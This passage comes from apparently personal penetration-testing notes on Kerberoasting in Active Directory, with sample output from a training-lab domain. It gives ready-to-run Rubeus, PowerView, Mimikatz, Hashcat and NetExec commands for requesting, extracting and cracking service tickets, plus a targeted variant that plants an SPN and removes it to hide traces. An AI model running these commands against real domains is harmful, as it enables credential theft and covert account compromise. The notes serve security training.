9B8F68DA9360D4087A13E4A2C64EE506F5BD59A8F314EBB964176325D99842BA6B1BE250EBC615E87A784A4C56CCAA54C0FE2D16A4F5C9C63B29BA3618050F407C7191DB60AEFC381EBB98238A7E9173C14FAB743D2795946E7B4870EF869956CDF14813EFE1BED6E53F8667AA287AE15D69F36A28D37AB551E1FA4E2FB4FFACF848F71BB4AF3AAD9DC6192F3560496BC7645BF741FC0666FE251DBD67C201C9D88FDB6D9F88789E3C9A2E43A5F262151675D9A1EE4404731DF5D65050A26DDC6B8F299A2F8E87748DFAEEB4339229758696E242CAC9613A47CA72AFC234E1D61AB7ADD00EA8183BE70408F8C125592AA515BE2553545543BB628560EB7DCAD78FCC6214697411532A10DEAF110D5E8A5B046C8976C75F344FAA8CA5B0B318098416A3B255CD8F5644AD4ABDF28D64AAB8A32B0DC1A4D21630586BEFFDD770D517E5EBFB66801942CCD5E70A40D3D9D25EB3E01248D42072FBE5B3C179CE6FE57D603E08F6178FC402A8B69103B81E0F82A59ABF35E9524156E83B9FB14070FA893C3483F331DD9FC5252556E8458BC05EBA724A235EEBD50271B581F29857449B423D046A881DB0B7C41163AF9B8FE5B698AB0369D3466B26EE59390ADD29827416D0A154E35C586ABA6EE6B82F56702678924182444821F08A73795D1F14F0AA831C52E768640D"
> ```

- Alternatively, use [`Invoke-Kerberoast`](https://powersploit.readthedocs.io/en/latest/Recon/Invoke-Kerberoast/):

```powershell
Import-Module .\PowerView.ps1
```
```powershell
Invoke-Kerberoast
```

> [!note] `Invoke-Kerberoast` is the older `PowerView` function for this; `Get-DomainSPNTicket` gives more control over what to request and how to format the results.

#### `Rubeus`

- [`Rubeus`](https://github.com/GhostPack/Rubeus#kerberoasting) (GhostPack) does everything the methods above do in one binary, via the `kerberoast` action, and gives you the most control over *what* gets requested.

- Recon without requesting tickets:

```powershell
Rubeus.exe kerberoast /stats
```

>[!example]-
> ```powershell
> PS C:\Tools> .\Rubeus.exe kerberoast /stats
> ```
> 
> ```powershell
>    ______        _
>   (_____ \      | |
>    _____) )_   _| |__  _____ _   _  ___
>   |  __  /| | | |  _ \| ___ | | | |/___)
>   | |  \ \| |_| | |_) ) ____| |_| |___ |
>   |_|   |_|____/|____/|_____)____/(___/
> 
>   v2.0.2
> 
> 
> [*] Action: Kerberoasting
> 
> [*] Listing statistics about target users, no ticket requests being performed.
> [*] Target Domain          : INLANEFREIGHT.LOCAL
> [*] Searching path 'LDAP://ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL/DC=INLANEFREIGHT,DC=LOCAL' for '(&(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))'
> 
> [*] Total kerberoastable users : 12
> 
> 
>  ------------------------------------------------------------
>  | Supported Encryption Type                        | Count |
>  ------------------------------------------------------------
>  | RC4_HMAC_DEFAULT                                 | 11    |
>  | AES128_CTS_HMAC_SHA1_96, AES256_CTS_HMAC_SHA1_96 | 1     |
>  ------------------------------------------------------------
> 
>  ----------------------------------
>  | Password Last Set Year | Count |
>  ----------------------------------
>  | 2022                   | 12    |
>  ----------------------------------
> ```

- Roast the whole domain:

```powershell
Rubeus.exe kerberoast /nowrap
```

>[!example]-
> ```powershell
> PS C:\Tools> .\Rubeus.exe kerberoast /nowrap
> ```
> 
> ```powershell
>    ______        _
>   (_____ \      | |
>    _____) )_   _| |__  _____ _   _  ___
>   |  __  /| | | |  _ \| ___ | | | |/___)
>   | |  \ \| |_| | |_) ) ____| |_| |___ |
>   |_|   |_|____/|____/|_____)____/(___/
> 
>   v2.0.2
> 
> 
> [*] Action: Kerberoasting
> 
> [*] NOTICE: AES hashes will be returned for AES-enabled accounts.
> [*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts.
> 
> [*] Target Domain          : INLANEFREIGHT.LOCAL
> [*] Searching path 'LDAP://ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL/DC=INLANEFREIGHT,DC=LOCAL' for '(&(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))'
> 
> [*] Total kerberoastable users : 12
> 
> 
> [*] SamAccountName         : adfs
> [*] DistinguishedName      : CN=adfs,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
> [*] ServicePrincipalName   : adfsconnect/azure01.inlanefreight.local
> [*] PwdLastSet             : 2/15/2022 2:15:27 PM
> [*] Supported ETypes       : RC4_HMAC_DEFAULT
> [*] Hash                   : $krb5tgs$23$*adfs$INLANEFREIGHT.LOCAL$adfsconnect/azure01.inlanefreight.local@INLANEFREIGHT.LOCAL*$C1FB6BC2#...
> 
> 
> [*] SamAccountName         : backupagent
> [*] DistinguishedName      : CN=BACKUPAGENT,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
> [*] ServicePrincipalName   : backupjob/veam001.inlanefreight.local
> [*] PwdLastSet             : 2/15/2022 2:15:40 PM
> [*] Supported ETypes       : RC4_HMAC_DEFAULT
> [*] Hash                   : $krb5tgs$23$*backupagent$INLANEFREIGHT.LOCAL$backupjob/veam001.inlanefreight.local@INLANEFREIGHT.LOCAL*$AFA34165#...
> 
> 
> [*] SamAccountName         : certsvc
> [*] DistinguishedName      : CN=certsvc,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
> [*] ServicePrincipalName   : http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL
> [*] PwdLastSet             : 3/30/2022 12:44:18 PM
> [*] Supported ETypes       : RC4_HMAC_DEFAULT
> [*] Hash                   : $krb5tgs$23$*certsvc$INLANEFREIGHT.LOCAL$http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL@INLANEFREIGHT.LOCAL*$A92C22BE#...
> 
> [*] SamAccountName         : damundsen
> [*] DistinguishedName      : CN=Dana Amundsen,OU=DevOps,OU=IT,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
> [*] ServicePrincipalName   : MSSQLSvc/ACADEMY-EA-DB01.INLANEFREIGHT.LOCAL:1433
> [*] PwdLastSet             : 3/24/2022 9:20:34 AM
> [*] Supported ETypes       : RC4_HMAC_DEFAULT
> [*] Hash                   : $krb5tgs$23$*damundsen$INLANEFREIGHT.LOCAL$MSSQLSvc/ACADEMY-EA-DB01.INLANEFREIGHT.LOCAL:1433@INLANEFREIGHT.LOCAL*$469E4FC5#... 
> 
> # ...
> ```

- Target privileged accounts only:

```powershell
Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap
```

>[!note]- `Rubeus` option breakdown
> 
> | Option                   | Description                                                                                                         |
> | ------------------------ | ------------------------------------------------------------------------------------------------------------------- |
> | `/user:username`         | Request a service ticket only for the specified service account.                                                    |
> | `/spn`                   | Kerberoast a specific SPN instead of enumerating all SPNs.                                                          |
> | `/ou`                    | Restrict enumeration to a specific OU (Organizational Unit).                                                        |
> | `/domain`                | Target Active Directory domain.                                                                                     |
> | `/dc`                    | Domain Controller to send request to.                                                                               |
> | `/creduser`              | Account to authenticate as instead of the current logon session.                                                    |
> | `/credpassword`          | Password for `/creduser`.                                                                                           |
> | `/credkey`               | Authenticate using a Kerberos key instead of a password.                                                            |
> | `/resultlimit:N`         | Limit the number of Kerberoast requests.                                                                            |
> | `/simple`                | Output only the extracted Kerberos hashes without additional information.                                           |
> | `/nowrap`                | Print hashes on a single line, preventing line wrapping for easier copying.                                         |
> | `/outfile`               | Save extracted Kerberos hashes directly to a file.                                                                  |
> | `/stats`                 | Display Kerberoastable accounts and encryption types without requesting service tickets. Useful for reconnaissance. |
> | `/ldapfilter:"(filter)"` | Apply a custom LDAP filter when searching for service accounts.                                                     |
> | `/pwdsetbefore:DATE`     | Target only accounts whose password was set before the specified date.                                              |
> | `/pwdsetafter:DATE`      | Target only accounts whose password was set after the specified date.                                               |
> | `/tgtdeleg`              | Use the Kerberos delegation trick to obtain RC4-encrypted tickets when possible, enabling faster offline cracking.  |
> | `/rc4opsec`              | Request RC4 tickets only from accounts that already support RC4, avoiding suspicious forced downgrades.             |
> | `/aes`                   | Request AES-encrypted service tickets instead of RC4 when supported.                                                |
> | `/aesopsec`              | Request AES tickets only from accounts that advertise AES support.                                                  |
> | `/enterprise`            | Use enterprise principal names (UPNs) instead of standard SPNs when appropriate.                                    |
> | `/delay`                 | Delay between requests, in milliseconds.                                                                            |
> | `/jitter`                | Percentage to randomize the delay by.                                                                               |
> | `/nopreauth`             | Perform Kerberoasting without domain credentials, using an account with pre-authentication disabled.                |
> 
#### Kerberoasting without pre-authentication


- It is possible to request and crack Service Ticket **without any valid domain credentials**, through an account that has **Kerberos pre-authentication disabled** (`DONT_REQUIRE_PREAUTH`, the same accounts susceptible to [[AS-REP roasting]]). This technique is called **Kerberoasting without pre-authentication** or **Blind Kerberoasting**.

- You first identity an account with pre-authentication disabled (an `AS-REP`-roastable account) and generate a list of potential service account usernames. Then you send an `AS-REQ` (Authentication Server Request) on behalf of the account with pre-authentication disabled and embed the target service account's username or SPN in the request. 
---

- This process can be automated using `Rubeus`'s `/nopreauth`:

```powershell
Rubeus.exe kerberoast /nopreauth:sql_svc /spn:"MSSQLSvc/sql01.example.com:1433" /domain:example.com /dc:dc01.example.com /nowrap
```


#### `PowerShell`

- Request tickets for a target account and load them into memory:

```powershell
Add-Type -AssemblyName System.IdentityModel
```

```powershell
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/DEV-PRE-SQL.example.com:1433"
```

> [!note]+ Command breakdown
> - The [`Add-Type`](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/add-type?view=powershell-7.2) cmdlet is used to add the `System.Identity` .NET class to the current PowerShell session.
> 	- [`System.IdentityModel`](https://docs.microsoft.com/en-us/dotnet/api/system.identitymodel?view=netframework-4.8) is a namespace that contains different classes for building security token services.
> - The [`New-Object`](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/new-object?view=powershell-7.2) cmdlet is used to create an instance of a .NET framework object.
> 	- The [`System.IdentityModel.Tokens`](https://docs.microsoft.com/en-us/dotnet/api/system.identitymodel.tokens?view=netframework-4.8) namespace with the [`KerberosRequestorSecurityToken`](https://docs.microsoft.com/en-us/dotnet/api/system.identitymodel.tokens.kerberosrequestorsecuritytoken?view=netframework-4.8) is used to create a security token and pass the SPN to the class to request a ST for the target account.
>
> This is essentially what [`Rubeus`](https://posts.specterops.io/kerberoasting-revisited-d434351bd4d1) automates when using the default Kerberoasting method.

- Request tickets for *every* SPN `setspn` found:

```powershell
setspn.exe -T EXAMPLE.COM -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }
```
#### Extracting tickets from memory using `Mimikatz`

- The requested tickets are now saved to the Kerberos cache. To extract them, use `Mimikatz`'s `kerberos::list` module.
- Base64 to `stdout` (no disk writes):

```powershell
mimikatz.exe "base64 /out:true" "kerberos::list /export" exit
```

 - `.kirbi` files to disk:

```powershell
mimikatz.exe "kerberos::list /export" exit
```

####  Converting the tickets into Hashcat format

- Convert a Base64-encoded ticket into `.kirbi` format: 

```bash
echo "<Base64_string>" | tr -d '\r\n' | base64 -d > sqldev.kirbi
```

- Use [`kirbi2john.py`](https://github.com/openwall/john/blob/bleeding-jumbo/run/kirbi2john.py) (ships with JohnTheRipper) to convert tickets from `kirbi` files into the format Hashcat can work with:

```bash
python3 kirbi2john.py sqldev.kirbi > sqldev_john.txt
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' sqldev_john.txt > sqldev_hashcat.txt
```

> [!note]- Why the `sed`?
>- `kirbi2john.py` outputs `$krb5tgs$user:hash`. 
>- Hashcat's mode `13100` wants the fields wrapped: `$krb5tgs$23$*user$realm$spn@realm*$hash`. 
>- `sed` reorders the fields into that shape.

## Cracking ST hashes

- Every method above yields one or more `$krb5tgs$...` strings; recovering the password is then offline cracking with Hashcat or John the Ripper. The `enctype` fixes the mode and how long the crack takes — see [[#Encryption types and the RC4 problem]].

### Encryption types and the RC4 problem

- Whether a ticket is worth roasting — and how long it takes — depends entirely on which encryption type (`enctype`) the KDC used to seal it.

- Encryption types in Kerberos:

| Encryption type (`enctype`) | Value         | Hashcat mode | Notes                                                                                                                                      |
| --------------------------- | ------------- | ------------ | ------------------------------------------------------------------------------------------------------------------------------------------ |
| `RC4-HMAC`                  | `23` (`0x17`) | `13100`      | The RC4 key is **derived directly from the account's NTLM hash**; can often be cracked almost as fast as NTLM hashes (meaning, very fast). |
| `AES128-CTS-HMAC-SHA1-96`   | `17` (`0x11`) | `19600`      | Key derivation uses PBKDF2 with **4,096 iterations**; significantly slower to crack.                                                       |
| `AES256-CTS-HMAC-SHA1-96`   | `18` (`0x12`) | `19700`      | Same PBKDF2 cost, bigger key; **slowest** of the three to crack.                                                                           |

> [!note] Other `enctype`s (such as DES) are deprecated and disabled by default; in practice you will only ever see RC4, AES-128, or AES-256 on real domains.

- The LDAP attribute `msDS-SupportedEncryptionTypes` on the account object controls what the KDC is allowed to use for that account:

```powershell
Get-DomainUser testspn -Properties samaccountname, serviceprincipalname, msds-supportedencryptiontypes
```

| Value         | Description                                                                                            |
| ------------- | ----------------------------------------------------------------------------------------------------- |
| `0`           | Undefined / default (both RC4 and AES remain usable, subject to domain policy).                       |
| `4`           | RC4 only.                                                                                             |
| `8`           | AES-128 only.                                                                                         |
| `16`          | AES-256 only.                                                                                         |
| `24` (`0x18`) | AES-128 **and** AES-256, **no RC4**. This is the setting to check when assessing downgrade potential. |
| `28`          | AES-128, AES-256 *and* RC4.                                                                           |

>[!important]+ The RC4 downgrade (`/tgtdeleg`)
> - Since AES is much more expensive to crack than RC4, if possible, try to find a way to obtain **RC4** tickets even when the target account supports AES. 
> - The **`/tgtdeleg`** option in `Rubeus` does exactly that: it abuses the KDC's delegation handling to obtain a TGT for the current user *without knowing the user's password*, and negotiates the exchange in a way that forces **RC4**.
> ```powershell
> Rubeus.exe kerberoast /user:testspn /tgtdeleg /nowrap
> ```
>- Whether the downgrade actually yields RC4 depends on the target account's `msDS-SupportedEncryptionTypes` and domain policy: an AES-only account makes the KDC return an AES ticket no matter what the client asks for. In practice it's reliable against legacy Domain Controllers (Windows Server 2016 and earlier) and accounts left at the RC4-permitting default.

### Hashcat

- Crack RC4 tickets (`etype 23`, mode `13100`):

```bash
hashcat -m 13100 -a 0 backupjobTGS.txt /usr/share/wordlists/rockyou.txt
```

>[!example]-
> ```bash
> hashcat -m 13100 -a 0 backupjobTGS.txt /usr/share/wordlists/rockyou.txt
> ```
> 
> ```bash
> hashcat (v6.2.6) starting
> 
> OpenCL API (OpenCL 2.1 LINUX) - Platform #1 [Intel(R) Corporation]
> ==================================================================
> * Device #1: AMD EPYC 7543 32-Core Processor, 3921/7907 MB (988 MB allocatable), 4MCU
> 
> OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #2 [The pocl project]
> ====================================================================================================================================================
> * Device #2: cpu-haswell-AMD EPYC 7543 32-Core Processor, skipped
> 
> Minimum password length supported by kernel: 0
> Maximum password length supported by kernel: 256
> 
> Hashes: 1 digests; 1 unique digests, 1 unique salts
> Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
> Rules: 1
> 
> Optimizers applied:
> * Zero-Byte
> * Not-Iterated
> * Single-Hash
> * Single-Salt
> 
> ATTENTION! Pure (unoptimized) backend kernels selected.
> Pure kernels can crack longer passwords, but drastically reduce performance.
> If you want to switch to optimized kernels, append -O to your commandline.
> See the above message to find out about the exact limits.
> 
> Watchdog: Hardware monitoring interface not found on your system.
> Watchdog: Temperature abort trigger disabled.
> 
> Host memory required for this attack: 1 MB
> 
> Dictionary cache building /usr/share/wordlists/rockyou.txt: 33553434 bytDictionary cache building /usr/share/wordlists/rockyou.txt: 134213744 byDictionary cache built:
> * Filename..: /usr/share/wordlists/rockyou.txt
> * Passwords.: 14344392
> * Bytes.....: 139921507
> * Keyspace..: 14344385
> * Runtime...: 1 sec
> 
> $krb5tgs$23$*backupjob$INLANEFREIGHT.LOCAL$INLANEFREIGHT.LOCAL/backupjob*$309c9b686162b14b12e4ac4e2176fc83$ac145bb544680fa02e039cb49eb59f2d5fc4e65798a8b29484929856ddf1c78fb553a344f706a0f5205c8bbe2a30dab9bff560923ff6c4fb4f1448d7f356a857ad44d26941c4af744e15439d914c71eb02335994a9c4fabc986646abe20571176c8c9bf5738e636e69c4864df4a289af86e5e86690f7e87defd64daf780ade15469a750ca1bb528ce4b3e57ca7b358787d10da71800d4cc5d967677a8940da9b7047ad655ab19fc5d0338ddd1cf1e20053b55e7d01c26fe69c91cb12e577f997416a5ecbd260482fc7962a489481c22409c37601909bb5cb010b98ef3f64f6d79a625c35020b643fe35c9902b628a8a145c9a9dcd5e864dba02946cd79c140a36081132cb5b39ba757a2052dae5707144393ccd6109baa0b672230dd688dbfcb8e994da9d8205c85e2a2e8f6d34c4689d7635d46c7b12dc262d8c47c8d70b26a06835d3dee96fa97b37f6caaeabd052e424d64dde2f5b7a4aa5d0f00abeeeae7ce2c11c992afe587efa4e8296cf3cc568436dfafc13171851c9ba73248b4a466615d3c53dc76aed4c6fb6428c8a848ebb14a89250eb3f89118a59c23a2702a2d2707d2b2f1ea16ae9043515582c1787a42aae004b3381473bdc1910307ede1f97004eb93a9bff74447d9c10f4edf1716bbd973e0b689042d00e954a034cc03ffc282062e1e9792860f5ecc22378bd0a5f87c40889d7ca3f0f34410c568788f32659ec866380b100b9af13d09ab53615c89c25ea41d77c2047cfc2183f1296318d337537b73d1fbca6b602b3605f9266f8b8e524b2e1e241c9b0cf4810c3e4c1aa43b97bba4f3e0cab65a3c2a4db941d7e3eee33520dda810c56dfd1435d6223d3bb9bf182fd81b3d25500fa5925584da06f5a77d6051deebf8dbe8e1e0310b8e089daf210933fa5fa75353a07d15851cd8352270b56a56e6e4fbce2308f5b1f2fef3c707faa71d8cf37ef5f3d4c68e4b0c6725f8b2dc1ec60166ea4c74621ca5fff1d3792c9c53473e7eb4158b4c09ba9cc44bc79226d995e13cdbdeeb631f62ba91fb79b4818fb5cb3e17a48f5a291ea772c1bb6655616a67417e5ab03077976b6f7a6aafa330bc5e35328834fffa9173319abb8067e3d73be25eafd17a627fa8d954e3ac61bdbdc9c8e0b7cb71684697ab2405a205895ffdd58c1fcc0f8afddfc19a910c93b0cd9f12b14871e8e6650bb097cd389b6bc37fe36e2e6e5430550e61753fd19c106762827d57d7d1b6c0b57a0860229392db302e4f7e7e0147105eb333bae38692861c29ec732ebff026e7c64b6483650961543db7e4c4416df6162ee687e03fff3409aab92aa407a5257bac9da5f82cce7bf63727:lucky7
>                                                           
> Session..........: hashcat
> Status...........: Cracked
> Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
> Hash.Target......: $krb5tgs$23$*backupjob$INLANEFREIGHT.LOCAL$INLANEFR...f63727
> Time.Started.....: Sat Oct 10 12:14:58 2026 (0 secs)
> Time.Estimated...: Sat Oct 10 12:14:58 2026 (0 secs)
> Kernel.Feature...: Pure Kernel
> Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
> Guess.Queue......: 1/1 (100.00%)
> Speed.#1.........:  1288.2 kH/s (1.30ms) @ Accel:512 Loops:1 Thr:1 Vec:8
> Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
> Progress.........: 2048/14344385 (0.01%)
> Rejected.........: 0/2048 (0.00%)
> Restore.Point....: 0/14344385 (0.00%)
> Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
> Candidate.Engine.: Device Generator
> Candidates.#1....: 123456 -> lovers1
> 
> Started: Sat Oct 10 12:14:48 2026
> Stopped: Sat Oct 10 12:14:59 2026
> ```


- Crack AES-128 tickets (`etype 17`, mode `19600`):

```bash
hashcat -m 19600 -a 0 aes_hashes.txt /usr/share/wordlists/rockyou.txt
```

- Crack AES-256 tickets (`etype 18`, mode `19700`):

```bash
hashcat -m 19700 -a 0 aes_hashes.txt /usr/share/wordlists/rockyou.txt
```

- Run a wordlist with mutation rules to catch minor password variations:

```bash
hashcat -m 13100 -a 0 backupjobTGS.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```

- Display hashes already cracked in a previous run (from the potfile):

```bash
hashcat -m 13100 backupjobTGS.txt --show
```

| Encryption           | Ticket format     | Hashcat mode |
| -------------------- | ----------------- | ------------ |
| RC4 (`etype 23`)     | `$krb5tgs$23$...` | `13100`      |
| AES-128 (`etype 17`) | `$krb5tgs$17$...` | `19600`      |
| AES-256 (`etype 18`) | `$krb5tgs$18$...` | `19700`      |

>[!note] See [[Hashcat]].
### John the Ripper

- John reads `$krb5tgs$` hashes directly with the `krb5tgs` format; for `.kirbi` files, convert them first with `kirbi2john.py` (shown above under the semi-manual Windows method).
- Crack the tickets:

```bash
john --format=krb5tgs --wordlist=/usr/share/wordlists/rockyou.txt SPNS
```

>[!example]-
> ```bash
> john --format=krb5tgs --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
> Created directory: /home/htb-ac-1908986/.john
> ```
> 
> ```bash
> Using default input encoding: UTF-8
> Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
> Will run 4 OpenMP threads
> Press 'q' or Ctrl-C to abort, almost any other key for status
> tinkerbell       (?)     
> 1g 0:00:00:00 DONE (2026-10-21 10:05) 100.0g/s 102400p/s 102400c/s 102400C/s 123456..bethany
> Use the "--show" option to display all of the cracked passwords reliably
> Session completed. 
> ```

- Display cracked passwords once the run completes:

```bash
john --format=krb5tgs SPNS --show
```

>[!note] See [[🛠️ JohnTheRipper]].
### Validating a recovered password

- Test the recovered password against domain services with [`NetExec`](https://github.com/Pennyw0rth/NetExec) over SMB:

```bash
nxc smb 172.16.5.5 -u sqldev -p 'database!'
```

- Over WinRM:

```bash
nxc winrm 172.16.5.5 -u sqldev -p 'database!'
```

- A `[+]` on SMB confirms the password is valid.

>[!example]-
> ```bash
> crackmapexec smb 172.16.5.5 -u SAPService -p '!SapperFi2'
> ```
> 
> ```bash
> [*] First time use detected
> [*] Creating home directory structure
> [*] Creating default workspace
> [*] Initializing LDAP protocol database
> [*] Initializing MSSQL protocol database
> [*] Initializing SMB protocol database
> [*] Initializing SSH protocol database
> [*] Initializing WINRM protocol database
> [*] Copying default configuration file
> [*] Generating SSL certificate
> SMB         172.16.5.5      445    ACADEMY-EA-DC01  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
> SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\SAPService:!SapperFi2
> ```

## Targeted Kerberoasting

- If you have write permissions over a target account, you can assign it an SPN manually and perform the Kerberoasting attack, even if that account hadn't previously had an SPN. This variant is called **targeted Kerberoasting**.
- The attack requires you to have write access to the target's `servicePrincipalName` attribute, granted by `GenericAll`, `GenericWrite`, or `WriteProperty` over that attribute or the target account. Members of the [[Account Operators]] group typically hold such rights.
- To perform the attack, you'd write an arbitrary SPN onto the account (e.g.,  `nonexistent/svc.example.com`), then request an ST for that SPN, crack the `$krb5tgs$` hash offline to get the account's password, and remove the SPN to cover the tracks.

>[!note] See [[AD ACL attacks]] and [[Account Operators]].

### From Linux

- To perform targeted Kerberoasting from Linux, you can use [`targetedKerberoast.py`](https://github.com/ShutdownRepo/targetedKerberoast). 
- `targetedKerberoast.py` can automatically check which accounts you have write permissions over, assigns SPNs, and Kerberoasts each (the cleanup is included):

```bash
targetedKerberoast.py -v -d example.com -u 'jdoe' -p 'passwd123' --dc-ip 10.10.11.5
```

- Target a specific account:

```bash
targetedKerberoast.py -v -d example.com -u 'jdoe' -p 'passwd123' --dc-ip 10.10.11.5 --request-user rroe
```

>[!note]- `targetedKerberoast.py` option breakdown
> | Option | Description |
> | ------ | ----------- |
> | `-d`, `--domain` | Authenticate to this domain (FQDN). |
> | `-u`, `--user` | Authenticate as this user. |
> | `-p`, `--password` | Authenticate with this password. |
> | `-H`, `--hashes` | Authenticate with an `LMHASH:NTHASH` ([[Pass-the-Hash]]). |
> | `-k`, `--kerberos` | Authenticate with a Kerberos `ccache`. |
> | `--no-pass` | Skip the password prompt (use with `-k`). |
> | `--aes-key` | Authenticate with a Kerberos AES key (128/256-bit). |
> | `--dc-ip` | Set the Domain Controller / KDC IP. |
> | `--dc-host` | Set the Domain Controller hostname (use when 445 is blocked or NTLM is disabled). |
> | `--use-ldaps` | Connect over LDAPS instead of LDAP. |
> | `-D`, `--target-domain` | Query and roast a different (trusted) domain. |
> | `-U`, `--users-file` | Read target usernames from a file, one per line. |
> | `--request-user` | Roast a single named user's SPN. |
> | `--only-abuse` | Skip accounts that already have an SPN; only write-and-roast. |
> | `--no-abuse` | Skip write-and-roast; only roast accounts that already have an SPN. |
> | `-o`, `--output-file` | Write the hashes to a file. |
> | `-f`, `--output-format` | Set the output format (`hashcat` or `john`; default: `hashcat`). |
> | `-v`, `--verbose` | Increase verbosity (`-vv` for debug). |
> | `-q`, `--quiet` | Suppress informational output. |

- Alternatively, you can use [[🛠️ NetExec & CrackMapExec|NetExec]]; it sets a temporary `cifs/<username>` SPN, requests the ticket, and removes the SPN automatically:

```bash
nxc ldap dc01.example.com -d example.com -u 'jdoe' -p 'passwd123' --kerberoasting output.txt --targeted-kerberoast rroe
```

### From Windows

- Check whether the target already has an SPN:

```powershell
Get-DomainUser 'rroe' | Select-Object serviceprincipalname
```

- Write an SPN onto the account with `PowerView`:

```powershell
Set-DomainObject -Identity 'rroe' -Set @{serviceprincipalname='nonexistent/SERVICE.EXAMPLE.COM'}
```

- ...or with the built-in `setspn.exe`:

```powershell
setspn.exe -S HTTP/app01.example.com EXAMPLE.COM\rroe
```

- Request and format the ticket (see [[#PowerView]]):

```powershell
Get-DomainUser -Identity 'rroe' | Get-DomainSPNTicket -Format Hashcat
```

- Remove the SPN afterwards:

```powershell
Set-DomainObject -Identity 'rroe' -Clear serviceprincipalname
```

## References and further reading

- [`T1558.003 — Steal or Forge Kerberos Tickets: Kerberoasting — MITRE ATT&CK`](https://attack.mitre.org/techniques/T1558/003/)
- [`RFC 4120 — The Kerberos Network Authentication Service (V5)`](https://www.rfc-editor.org/info/rfc4120)
- [`Service Principal Names — Microsoft Learn`](https://learn.microsoft.com/en-us/windows/win32/ad/service-principal-names)
- [`Decrypting the Selection of Supported Kerberos Encryption Types — Microsoft Tech Community`](https://techcommunity.microsoft.com/t5/core-infrastructure-and-security/decrypting-the-selection-of-supported-kerberos-encryption-types/ba-p/1628797)
- [`Event 4769 — A Kerberos service ticket was requested — Microsoft Learn`](https://learn.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4769)
- [`Group Managed Service Accounts — Microsoft Learn`](https://learn.microsoft.com/en-us/windows-server/security/group-managed-service-accounts/group-managed-service-accounts-overview)
---
- [`Rubeus — GhostPack GitHub`](https://github.com/GhostPack/Rubeus)
- [`Impacket — Fortra GitHub`](https://github.com/fortra/impacket)
- [`NetExec — Pennyw0rth GitHub`](https://github.com/Pennyw0rth/NetExec)
- [`targetedKerberoast — ShutdownRepo GitHub`](https://github.com/ShutdownRepo/targetedKerberoast)
---
- [`Attacking Kerberos: Kicking the Guard Dog of Hades — Tim Medin, DerbyCon 2014`](https://www.youtube.com/watch?v=HHJWfG9b0-E)
- [`Kerberoasting without Mimikatz — HarmJ0y`](https://www.harmj0y.net/blog/redteaming/kerberoasting-without-mimikatz/)
- [`Kerberoasting Revisited — SpecterOps`](https://specterops.io/blog/2019/02/20/kerberoasting-revisited/)
- [`Kerberoasting — The Hacker Recipes`](https://www.thehacker.recipes/ad/movement/kerberos/kerberoast)
- [`Targeted Kerberoasting — The Hacker Recipes`](https://www.thehacker.recipes/ad/movement/dacl/targeted-kerberoasting)
- [`Kerberoasting — NetExec Wiki`](https://www.netexec.wiki/ldap-protocol/kerberoasting)
